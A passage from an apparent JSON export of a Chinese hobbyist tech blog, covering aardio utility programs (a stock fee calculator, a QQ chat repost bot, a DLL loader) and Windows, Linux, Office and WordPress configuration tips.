#x27;微软雅黑&#x27;;h=-14);transparent=1;z=17&#125;;static11=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=108;top=259;right=201;bottom=284;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=18&#125;;static12=&#123;cls=&quot;static&quot;;text=&quot;卖出佣金=&quot;;left=212;top=259;right=286;bottom=282;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=25&#125;;static13=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=278;top=259;right=371;bottom=284;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=26&#125;;static14=&#123;cls=&quot;static&quot;;text=&quot;融资利息=&quot;;left=384;top=219;right=464;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=27&#125;;static15=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=450;top=219;right=543;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=28&#125;;static16=&#123;cls=&quot;static&quot;;text=&quot;融券利息=&quot;;left=384;top=259;right=464;bottom=283;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=29&#125;;static17=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=450;top=259;right=543;bottom=284;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=30&#125;;static18=&#123;cls=&quot;static&quot;;text=&quot;税费合计=&quot;;left=40;top=298;right=115;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=31&#125;;static19=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=108;top=298;right=201;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=32&#125;;static2=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=278;top=219;right=371;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=24&#125;;static20=&#123;cls=&quot;static&quot;;text=&quot;盈亏合计=&quot;;left=212;top=298;right=286;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=33&#125;;static21=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=278;top=298;right=371;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=34&#125;;static22=&#123;cls=&quot;static&quot;;text=&quot;盈亏比例=&quot;;left=384;top=298;right=464;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=36&#125;;static23=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=450;top=298;right=543;bottom=323;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=37&#125;;static24=&#123;cls=&quot;static&quot;;text=&quot;‰&quot;;left=243;top=46;right=267;bottom=66;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=35&#125;;static25=&#123;cls=&quot;static&quot;;text=&quot;%&quot;;left=291;top=93;right=315;bottom=113;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=39&#125;;static26=&#123;cls=&quot;static&quot;;text=&quot;%&quot;;left=153;top=93;right=177;bottom=113;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=41&#125;;static27=&#123;cls=&quot;static&quot;;text=&quot;计息天数&quot;;left=316;top=93;right=384;bottom=113;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=42&#125;;static28=&#123;cls=&quot;static&quot;;text=&quot;访问作者博客&quot;;left=20;top=355;right=108;bottom=380;ah=1;aw=1;color=16711680;font=LOGFONT(h=-14;name=&#x27;微软雅黑&#x27;;underline=1);notify=1;transparent=1;z=44&#125;;static3=&#123;cls=&quot;static&quot;;text=&quot;佣金率&quot;;left=158;top=46;right=210;bottom=66;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=6&#125;;static4=&#123;cls=&quot;static&quot;;text=&quot;买入量&quot;;left=41;top=138;right=94;bottom=158;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=7&#125;;static5=&#123;cls=&quot;static&quot;;text=&quot;买入价&quot;;left=169;top=138;right=222;bottom=158;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=9&#125;;static6=&#123;cls=&quot;static&quot;;text=&quot;卖出量&quot;;left=296;top=138;right=342;bottom=158;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=11&#125;;static7=&#123;cls=&quot;static&quot;;text=&quot;卖出价&quot;;left=421;top=138;right=474;bottom=158;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=14&#125;;static8=&#123;cls=&quot;static&quot;;text=&quot;过户费=&quot;;left=40;top=219;right=115;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=15&#125;;static9=&#123;cls=&quot;static&quot;;text=&quot;0&quot;;left=108;top=219;right=201;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=16&#125;)/*&#125;&#125;*/mainForm.static28.oncommand = function(id,event)&#123; process.execute(&quot;http://sobaigu.com&quot;);&#125;mainForm.checkbox3.oncommand = function(id,event)&#123; mainForm.checkbox2.checked = false;&#125;mainForm.checkbox2.oncommand = function(id,event)&#123; mainForm.checkbox3.checked = false;&#125;//沪市被选中时则深市取消选择mainForm.checkbox1.oncommand = function(id,event)&#123; mainForm.checkbox.checked = false;&#125;//深市被选中时则沪市取消选择mainForm.checkbox.oncommand = function(id,event)&#123; mainForm.checkbox1.checked = false;&#125;//启动时窗口焦点位于买入数量框mainForm.edit2.setFocus();mainForm.edit.text = 0.25;mainForm.edit2.text = 0;mainForm.edit3.text = 0;mainForm.edit4.text = 0;mainForm.edit5.text = 0;mainForm.edit6.text = 9.5;mainForm.edit7.text = 8.5;mainForm.edit8.text = 0;//开始计算按钮mainForm.button.oncommand = function(id,event)&#123; //取得佣金比例 var chargepercent = mainForm.edit.text; //取得买入价格和买入量 var buyprice = mainForm.edit3.text; var buynum = mainForm.edit2.text; //取得卖出价格和卖出量 var sellprice = mainForm.edit5.text; var sellnum = mainForm.edit4.text; //融资融券年息 var sellyper = mainForm.edit6.text; var buyyper = mainForm.edit7.text; var chargeday = mainForm.edit8.text; //处理输入不正确 if(buynum == &quot;&quot; or buyprice == &quot;&quot; or sellnum == &quot;&quot; or sellprice == &quot;&quot;)&#123; mainForm.msgbox(&quot;请输入正确的数量及价格&quot;); return false; &#125; if((buynum == 0 or buyprice == 0) and (sellnum == 0 or sellprice == 0))&#123; mainForm.msgbox(&quot;请输入正确的数量及价格&quot;); return false; &#125; if((mainForm.checkbox2.checked == true or mainForm.checkbox3.checked == true) and mainForm.edit8.text == &quot;&quot;)&#123; mainForm.msgbox(&quot;请输入正确的计息天数&quot;); return false; &#125; //var 过户费 = mainForm.static9.text=((买入股数+卖出股数)/1000)*1,沪市才收; var b = buynum/1000; var s = sellnum/1000; if(b &gt; 0 and b &lt; 1)&#123; b = 1; &#125; if(s &gt; 0 and s &lt; 1)&#123; s = 1; &#125; bs = b + s; if(mainForm.checkbox.checked == true)&#123; bs = 0; &#125; mainForm.static9.text = string.format(&quot;%.2f&quot;, bs) bs = mainForm.static9.text; //var 印花税 = mainForm.static11.text=(卖出价格*卖出股数)*1‰; var fcost = (sellprice * sellnum)/1000; mainForm.static11.text = string.format(&quot;%.2f&quot;, fcost); fcost = mainForm.static11.text; //var 买入佣金 = mainForm.static2.text=(买入价格*买入股数)*佣金比例,不足5元按5元收; var bcost = buyprice * buynum * chargepercent/1000; if(bcost &gt;0 and bcost &lt;5)&#123; bcost = 5; &#125; mainForm.static2.text = string.format(&quot;%.2f&quot;, bcost); bcost = mainForm.static2.text; //var 卖出佣金 = mainForm.static13.text; var scost = sellprice * sellnum * chargepercent/1000; if(scost &gt;0 and scost &lt;5)&#123; scost = 5; &#125; mainForm.static13.text = string.format(&quot;%.2f&quot;, scost); scost = mainForm.static13.text; //var 融资利息 = mainForm.static15.text=融资买入额*天数*年息/360; instb = buyprice * buynum * chargeday * buyyper/(100 * 360); if(mainForm.checkbox2.checked != true)&#123; instb = 0; &#125; mainForm.static15.text = string.format(&quot;%.2f&quot;, instb); instb = mainForm.static15.text; //var 融券利息 = mainForm.static17.text=融券卖出额*天数*年息/360; insts = sellprice * sellnum * chargeday * sellyper/(100 * 360); if(mainForm.checkbox3.checked != true)&#123; insts = 0; &#125; mainForm.static17.text = string.format(&quot;%.2f&quot;, insts); insts = mainForm.static17.text; //var 税费合计 = mainForm.static19.text=买入佣金+[过户费]+卖出佣金+印花税+融资利息|融券利息; mainForm.static19.text = insts + instb + scost + bcost + fcost + bs; vcost = mainForm.static19.text; //var 盈亏合计 = mainForm.static21.text=卖出金额-买入金额-税费合计+剩余股票市值; vgain = sellprice * sellnum - (buyprice * buynum + vcost); sen = tonumber(sellnum,10); bun = tonumber(buynum,10); if(mainForm.checkbox3.checked != true and sen &gt; bun)&#123; mainForm.msgbox(&quot;没这么多股票可卖!&quot;); return false; &#125; if(sen &lt; bun)&#123; vgain = sellprice * sellnum - buyprice * buynum -vcost + sellprice * (buynum - sellnum); //mainForm.msgbox(&quot;sellnum &lt; buynum&quot;) &#125; mainForm.static21.text = string.format(&quot;%.2f&quot;, vgain); //var 盈亏比例 = mainForm.static23.text=盈亏合计/投入金额*100%; pgain = vgain/(buyprice * buynum + vcost); mainForm.static23.text = string.format(&quot;%.3f&quot;, pgain)*100+&quot;%&quot;;&#125;mainForm.button2.oncommand = function(id,event)&#123; mainForm.edit3.text = &quot;&quot;; mainForm.edit2.text = &quot;&quot;; mainForm.edit5.text = &quot;&quot;; mainForm.edit4.text = &quot;&quot;; mainForm.edit2.setFocus();&#125;var atom,hwnd/*冲突窗口的句柄,该函数会自动激活此窗口*/ = mainForm.atom(&quot;stock_calc_by_sobaigu.com&quot;);if(!atom)&#123; /*为窗口设置原子值可以避免一个程序重复运行多个实例*/ win.quitMessage(); return;&#125;//显示窗体mainForm.show()win.loopMessage();","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"解决虚拟机网卡_无法识别","slug":"vbox-ethernet-driver","date":"2014-11-05T05:22:35.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"vbox-ethernet-driver.html","permalink":"https://sobaigu.com/vbox-ethernet-driver.html","excerpt":"","text":"前言 作为一个互联网IT行业从业人员，除了工作机，我们还需要测试机，测试机中虚拟机那是必不可少了。 测试机主要是vmware，virtualbox及virtualpc，virtualpc虽然背靠微软大树，但真心没见几人用.vmware workstation算是虚拟机的老大，所以安装虚拟机时找不到网卡，声卡等驱动的几率较小，如若默认驱不上，随便拖个带网卡版的驱动人生或驱动精灵，都会将vmxnet.sys作为驱动使用，所以vmware的虚拟机基本不愁驱动。 除了vmware，virtualbox是本人比较喜欢的虚拟机软件，Windows版免费，Linux版开源，安装文件小巧且没有多余的功能，有软件洁癖的人使用再适合不过了。 问题 在安装一些精简版系统时，有时候会造成虚拟网卡无法识别，使用带网卡版驱动安装工具也无法匹配合适的驱动，此时我们需要手动安装驱动，也省得安装其他软件。 解决步骤 首先，需要下载virtualbox的网卡驱动 下载地址 每列提取码与链接对应，如为空表示直接点进去链接不需要提取码，无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 imht 将下载好的压缩包解压，将需要的驱动使用共享文件夹或拖拽复制到虚拟机中.共享文件夹使用方法自行网络搜索，一般添加好了共享文件夹后，虚拟机资源管理器(双击我的电脑后弹出的那个窗就是)中输入\\\\vboxsvr就打开了。 手动安装驱动 打开设备管理器，在需要安装驱动的网络适配器上右键&gt;更新驱动程序&gt;在硬件更新向导页面上选择&quot;从列表或指定位置安装(高级)&quot;，点击下一步&gt;选择&quot;不要搜索，我要自己选择需要安装的驱动程序&quot;，点击下一步&gt;点击&quot;从磁盘安装&quot;&gt;下方的&quot;厂商文件复制来源&quot;选择框中，浏览选择之前解压好的驱动安装inf配置文件，然后点击确定就可以了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"shell环境设置系统时区","slug":"set-linux-zoneinfo-with-shell","date":"2014-10-20T00:48:41.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"set-linux-zoneinfo-with-shell.html","permalink":"https://sobaigu.com/set-linux-zoneinfo-with-shell.html","excerpt":"一般买的VPS都是美国的,里面的时区也自然默认是西4区,虽然对我们搭个网站什么的没有影响,但总归与身在天朝的穷屌丝的计算思维格格不入,作为一个屌丝,最起码是要把时间搞清楚的吧. Linux下设置系统时区的方法大同小异,工作站有图形界面的就不费页面了,俺VPS上装的centos没有界面,采用远程shell命令设置也是一样的.当然,XWindows下也可以装逼用shell命令设置…","text":"一般买的VPS都是美国的,里面的时区也自然默认是西4区,虽然对我们搭个网站什么的没有影响,但总归与身在天朝的穷屌丝的计算思维格格不入,作为一个屌丝,最起码是要把时间搞清楚的吧. Linux下设置系统时区的方法大同小异,工作站有图形界面的就不费页面了,俺VPS上装的centos没有界面,采用远程shell命令设置也是一样的.当然,XWindows下也可以装逼用shell命令设置… #查看下当前系统时间 12345[root@localhost ~]# dateSun Oct 19 20:23:45 EDT 2014#带个-R参数就能看到时区了,此机器所在时区为-04区,也就是西4区了,美国东部时间哈...[root@localhost ~]# date -RSun, 19 Oct 2014 20:25:06 -0400 只需要1条命令就可以将系统时区设置为天朝时区了,东8区选址shanghai 123[root@localhost ~]# cp -f /usr/share/zoneinfo/Asia/Shanghai /etc/localtime#提示是否覆盖,按Y回车cp: overwrite `/etc/localtime&#x27;? y 覆盖好后看下效果 123[root@localhost ~]# date -R#已经显示+08区了Mon, 20 Oct 2014 08:40:22 +0800 使用下面的命令写入系统时间设置,防止系统重启后被还原. 1[root@localhost ~]# clock -w 至此,Linux的系统时区就设置好了,终于与天朝时区同步了,再也不会产生错觉,设置定时任务更有底了…","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Office 2013_永久激活信息备份还原_简明教程_注意事项","slug":"office-2013-license-backup-backup","date":"2014-09-21T05:17:45.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"office-2013-license-backup-backup.html","permalink":"https://sobaigu.com/office-2013-license-backup-backup.html","excerpt":"Office 2013永久激活后及时备份激活信息可以保证重装后快速激活。网上也有流行的各种备份工具，虽然操作简单，但是如果不理解其中的原理，有时很容易造成激活失败。下面介绍一下手工备份及还原激活信息的方法，在不同的操作系统下方法略有差异。","text":"Office 2013永久激活后及时备份激活信息可以保证重装后快速激活。网上也有流行的各种备份工具，虽然操作简单，但是如果不理解其中的原理，有时很容易造成激活失败。下面介绍一下手工备份及还原激活信息的方法，在不同的操作系统下方法略有差异。 激活信息备份 Windows 7系统下 保存好tokens.dat文件C:\\ProgramData\\Microsoft\\OfficeSoftwareProtectionPlatform。 Windows 8系统下 打开C:\\Windows\\System32\\spp\\store文件夹（注意要显示隐藏文件），将data.dat、tokens.dat、cache文件夹下的cache.dat复制出来保存。 务必牢记激活密钥，恢复时用得到。 激活信息还原 Windows7系统下 以管理员身份运行“命令提示符”键入：net stop osppsvc 断网，使用备份的tokens.dat覆盖源文件 以管理员身份运行“命令提示符”键入：net start osppsvc 打开Office程序，等待自动配置完毕，输入激活密钥即可成功激活 Windows8系统下 以管理员身份运行“命令提示符”键入：net stop sppsvc 只需把备份的“3个文件”（data.dat、tokens.dat、 cache.dat）覆盖源文件即可成功激活。 以管理员身份运行“命令提示符”键入：net start sppsvc 与其他文章对比，可以看到Office 2013和Windows8.1/8的激活信息文件，笔者介绍的方法没有区分开，实际上Windows8.1/8无需备份tokens.dat，Office 2013无需备份cache.dat，但是要实现二者的激活务必同时备份三个文件，恢复时也必须同时恢复这三个文件，以实现成功激活，因此介绍方法时没有加以区分。 注意事项 必须是同一台电脑（注意：不是同一型号），硬件变动也不能太大。 Windows8.1/8必须和Office 2013同时备份、同时还原，否则容易失败。 使用备份的文件直接覆盖源文件，注意不要覆盖文件夹，以免出错。 参考链接:http://www.heu8.com/415.html","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"自动备份工具:WordPress Backup to Dropbox","slug":"wordpress-tool-wordpress-backup-to-dropbox","date":"2014-09-18T15:50:07.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"wordpress-tool-wordpress-backup-to-dropbox.html","permalink":"https://sobaigu.com/wordpress-tool-wordpress-backup-to-dropbox.html","excerpt":"","text":"玩WordPress的同学,其实很多都像咱这样的业余爱好者,不想局限于QQ空间,人人等,虽然那些巨头提供了较好的空间,资源也免费,但我们有自己的诉求,总想整点自己想要的东西,所以我们都申请个不值钱的域名(当然,也有幸运的,如weibo.com这同学,10年间自己名字突然值800w了),自己瞎折腾.玩WordPress嘛,就是要这个折腾劲. 折腾自己的网站需要带宽,需要服务器,而大多数人是没这个能力的,所以我们就叫穷折腾.所以我们淘宝上买个几十块的垃圾空间,也不知道人家会开多久,也不知道那个上面什么内容哪天被天朝和谐…总之,网站放上面总是胆战心惊,没有备份哪成? 备份有很多种方法,大致为: 1.服务器上启用备份任务,文件和数据库都可以—服务器是人家的,咱这个不靠谱. 2.自己每天勤劳备份,自立更生—用ftp把文件下载到本地,用phpmyadmin导出数据库,或者登录网站用WordPress的导出功能,这个可行,但太累,而且效率低下. 3.使用插件实现自动备份—有这种功能的插件不少,但大多不太好用.庆幸的是,找到一个比较靠谱的:WordPress Backup to Dropbox. WordPress Backup to Dropbox是一个老牌备份插件,以前有人推荐wp Time Machine (for Backups),但用过后发现效果不尽如人意,wp Time Machine无法自动备份数据库(虽然号称可以,具体不知道哪块错误,日志里显示成功,但dropbox里没有). 在不断地试用各种插件后,最终发现WordPress Backup to Dropbox比较能满足咱这种懒人穷瞎折腾的主.安装此插件,我们只需要在WordPress后台搜索WordPress Backup to Dropbox即可找到,官方简介如下: WordPress Backup to Dropbox automatically creates a backup of your entire website, including all files and its database, within Dropbox. 插件作者主页 此插件安装完成后,设置也比较简单.前前后后只需要一步:关联dropbox账号 启用插件后在设置中会出现WordPress Backup to Dropbox菜单,具体我就不多说了,没有什么好说的,就那么几项,填好就可以了.设置好你要保存的目录及备份任务启动时间,建议是每周一次. 将备份存储到Dropbox的这个文件夹中设置的目录可以选择默认,也可以自己取一个简单明了的名,没测试过是否会自动创建,最好是在dropbox中已有的文件夹,没有的话自己登陆dropbox新建一个就可以了. 下次有状况,有需求要恢复,你知道该怎么做吧? 我写过一篇简单的使用教程,不嫌弃的可以自己去看看,老鸟就漂过算了吧:网站搬家,备份与还原","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"搜狗输入法卸载后要求重启_解决办法","slug":"sogou-input-ask-reboot","date":"2014-08-30T01:27:06.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"sogou-input-ask-reboot.html","permalink":"https://sobaigu.com/sogou-input-ask-reboot.html","excerpt":"搜狗输入法很久没升级了,换了个去广告版,卸载了官方版,可再安装的时候提示: 搜狗拼音输入法 智慧版2.0 安装 您上次已经进行了搜狗输入法的安装或卸载操作要求重启。 您在重启之后才能继续新的输入法安装卸载操作。","text":"搜狗输入法很久没升级了,换了个去广告版,卸载了官方版,可再安装的时候提示: 搜狗拼音输入法 智慧版2.0 安装 您上次已经进行了搜狗输入法的安装或卸载操作要求重启。 您在重启之后才能继续新的输入法安装卸载操作。 重启系统还是如此提示,所以应该是搜狗输入法卸载有残留,重启后要求重启的状态标识没有重置导致. 一般此类标识多为注册表项或键值,搜狗输入法为注册表中搜狗注册表项下有个reboot项,字面意思即为删除此注册表就不需要重启了,直接把以下内容保存为reg文件导入即可. 1234#64位系统下搜狗注册表Windows Registry Editor Version 5.00[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\SogouInput\\reboot] #[-...]代表将该注册表项删除 1234#32位系统下搜狗注册表Windows Registry Editor Version 5.00[-HKEY_LOCAL_MACHINE\\SOFTWARE\\SogouInput\\reboot] #[-...]代表将该注册表项删除 其他软件也可能出现此类问题,一般找对应注册表就可以了,这里给个通用的,有时候也会有用. 123[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager]#找到以下名称注册表键删除&quot;PendingFileRenameOperations&quot;","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"aardio-做QQ聊天_机器人-我是跟屁虫","slug":"aardio-qq-chat-with-you","date":"2014-08-23T06:59:57.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"aardio-qq-chat-with-you.html","permalink":"https://sobaigu.com/aardio-qq-chat-with-you.html","excerpt":"同事们组建了个聊天群,头衔是白痴,傻瓜啥的,为了争取升级为逗比,大家使劲刷,手工刷多没意思啊,做了个机器人跟屁虫,等离开座位就可以开起来自动刷…不怕垫底了,哈哈. 实现功能: 查找指定名称的窗口; 定时复制最后一行聊天记录,如果和上一次不一样,则粘贴发送","text":"同事们组建了个聊天群,头衔是白痴,傻瓜啥的,为了争取升级为逗比,大家使劲刷,手工刷多没意思啊,做了个机器人跟屁虫,等离开座位就可以开起来自动刷…不怕垫底了,哈哈. 实现功能: 查找指定名称的窗口; 定时复制最后一行聊天记录,如果和上一次不一样,则粘贴发送 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import win.ui;import win.ui.atom;import winex;import winex.key;import winex.mouse;import win.clip;/*DSG&#123;&#123;*/mainForm = win.form(text=&quot;QQ聊天跟屁虫&quot;;right=489;bottom=150;max=false)mainForm.add(button=&#123;cls=&quot;button&quot;;text=&quot;启动跟屁虫模式&quot;;left=27;top=87;right=230;bottom=121;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-16);z=2&#125;;button2=&#123;cls=&quot;button&quot;;text=&quot;停止跟屁虫模式&quot;;left=260;top=87;right=463;bottom=121;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-16);z=4&#125;;edit=&#123;cls=&quot;edit&quot;;left=125;top=28;right=462;bottom=54;db=1;dl=1;dr=1;dt=1;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);multiline=1;z=1&#125;;static=&#123;cls=&quot;static&quot;;text=&quot;聊天窗名称&quot;;left=31;top=30;right=117;bottom=53;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-16);transparent=1;z=3&#125;)/*&#125;&#125;*/mainForm.button2.oncommand = function(id,event)&#123; mainForm.killtimer(tmid)//移除此定时器&#125;var atom,hwnd/*冲突窗口的句柄,该函数会自动激活此窗口*/ = mainForm.atom(&quot;sobaigu_qqchat&quot;);if(!atom)&#123; /*为窗口设置原子值可以避免一个程序重复运行多个实例*/ win.quitMessage(); return;&#125;mainForm.button.oncommand = function(id,event)&#123; mainForm.killtimer(tmid)//移除此定时器 var chatname = mainForm.edit.text; if(chatname == &quot;&quot;)&#123; win.msgboxTimeout(&quot;请输入聊天窗口名称&quot;,,2000); return ; &#125; //获取剪贴板内容 clicp1 = win.clip.read(); //mainForm.msgbox(clicp1); //定时器 tmid = mainForm.addtimer( 1000/*毫秒*/, function(hwnd,msg,id,tick)&#123;//定时执行代码 //查找指定的窗口并激活 wintitle = winex.findActivate( chatname ); if (wintitle == false)&#123; win.msgboxTimeout(&quot;未找到该窗口,特殊符号需在前面加\\进行转义&quot;,,2000); return ; &#125; //获取最后一行聊天记录左坐标并点击复制 var x,y = win.toClient(wintitle,x,y); winex.mouse.click(wintitle,45,345); key.combine(&quot;CTRL&quot;,&quot;C&quot;); clicp2 = win.clip.read(); //mainForm.msgbox(clicp2); if(clicp2 != clicp1)&#123; key.combine(&quot;CTRL&quot;,&quot;V&quot;); key.press(&quot;ENTER&quot;);//回车发送 clicp1 = clicp2; win.delay(1500); //处理专属表情报错问题 errmsg, ,qqcname = winex.findExists(&quot;提示&quot;,,&quot;TXGuiFoundation&quot;); if(errmsg == true)&#123; winex.close(errmsg);//关闭窗口 key.combine(&quot;CTRL&quot;,&quot;A&quot;); key.press(&quot;BACK&quot;); &#125; &#125; //mainForm.settimer(id,2000)//重新设定时间间隔 &#125; );&#125;mainForm.show();win.loopMessage();","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"aardio写个简单的DLL调用工具","slug":"aardio-loaddll-tool","date":"2014-08-13T13:01:37.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"aardio-loaddll-tool.html","permalink":"https://sobaigu.com/aardio-loaddll-tool.html","excerpt":"对于几乎零基础的俺来说,各种语法实在是傻傻分不清楚. aardio的确是个好东西,居然从零开始,对着帮助手册写出了个测试工具,简单实用,good.","text":"对于几乎零基础的俺来说,各种语法实在是傻傻分不清楚. aardio的确是个好东西,居然从零开始,对着帮助手册写出了个测试工具,简单实用,good. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/*一个简单的测试辅助工具新手学习用,还存在载入按钮不能二次使用的问题*/import win.ui;import fsys.dlg/*DSG&#123;&#123;*/mainForm = win.form(text=&quot;简单的测试辅助工具&quot;;right=599;bottom=47)mainForm.add(button=&#123;cls=&quot;button&quot;;text=&quot;浏览&quot;;left=415;top=12;right=495;bottom=36;dr=1;dt=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=2&#125;;button2=&#123;cls=&quot;button&quot;;text=&quot;载入&quot;;left=507;top=12;right=587;bottom=36;dr=1;dt=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=3&#125;;edit=&#123;cls=&quot;edit&quot;;text=&quot;文件路径&quot;;left=12;top=12;right=403;bottom=36;acceptfiles=1;aw=1;color=-1;dl=1;dr=1;dt=1;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);multiline=1;tabstop=1;z=1&#125;)/*&#125;&#125;*/filepath = mainForm.edit.text;mainForm.edit.oncommand = function(id,event)&#123; if(filepath == &quot;文件路径&quot;)&#123; if(event == 0x100/*_EN_SETFOCUS*/)&#123; owner.text = &quot;&quot;; &#125; return ; &#125; return ;&#125;//浏览打开文件mainForm.button.oncommand = function(id,event)&#123; var str = fsys.dlg.open(&quot;动态库|*.dll|所有文件|*.*|&quot;);//过滤打开的文件类型 mainForm.edit.text = str;&#125;mainForm.button2.oncommand = function(id,event)&#123; var filepath = mainForm.edit.text;//重新取值 var dllname = string.endWith(&quot;dll&quot;,&quot;dll&quot;); if(filepath == &quot;&quot;)&#123; mainForm.msgbox(&quot;请选择或输入文件路径&quot;); return ; &#125; elseif(dllname == false)&#123; mainForm.msgbox(&quot;只支持dll文件载入&quot;); &#125; else &#123; try&#123; raw.loadDll(filepath);//加载选择的DLL文件 &#125; win.msgboxTimeout(&quot;已经执行载入&quot;,&quot;提示&quot;,2000); &#125; return ;&#125;mainForm.show();//显示窗体win.loopMessage();","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"删除这台电脑_我的电脑_中的默认文件夹","slug":"remove-default-dirs-in-my-computer","date":"2014-07-24T09:28:27.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"remove-default-dirs-in-my-computer.html","permalink":"https://sobaigu.com/remove-default-dirs-in-my-computer.html","excerpt":"","text":"Windows 8.1 默认的视频、图片、文档、下载、音乐、桌面等常用文件夹显示在这台电脑(我的电脑)中。这些文件夹感觉有点碍事,我们可以修改注册表,将并不需要的文件夹从这台电脑中删除掉。 进入注册表编辑器后依次展开,找到如下注册表位置: 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\ 展开NameSpace按以下对应关系,将不需要的相应键值删除即可. 下载：{374DE290-123F-4565-9164-39C4925E4678} 桌面：{B4BFCC3A-DB2C-424C-BO29-7FE99A87C641} 音乐：{1CF1260C-4DD0-4ebb-811F-33C572699FDE} 图片：{3ADD1653-EB32-4cb0-BBD7-DFA0ABB5ACCA} 视频：{A0953C92-50DC-43bf-BE83-3742FED03C9C} 文档：{A8CDFF1C-4878-43be-B5FD-F8091C1C60D0} 